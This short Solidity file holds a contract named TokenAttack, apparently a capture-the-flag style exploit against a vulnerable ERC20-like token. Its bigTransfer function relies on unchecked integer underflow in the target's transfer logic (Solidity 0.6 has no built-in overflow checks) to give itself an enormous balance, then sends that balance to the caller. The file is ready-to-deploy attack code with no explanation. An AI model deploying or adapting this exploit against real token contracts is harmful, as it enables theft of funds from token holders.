// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DeployedToken {
  function transfer(address _to, uint _value) public returns (bool) { }

  function balanceOf(address _owner) public view returns (uint balance) { }
}

contract TokenAttack {
  function bigTransfer(address _tokenAddress) public {
    DeployedToken tokenContract = DeployedToken(_tokenAddress);

    tokenContract.transfer(msg.sender, 1);
    uint attackerBalance = tokenContract.balanceOf(address(this));
    uint receiverBalance = tokenContract.balanceOf(msg.sender);
    tokenContract.transfer(msg.sender, attackerBalance - receiverBalance);
  }
}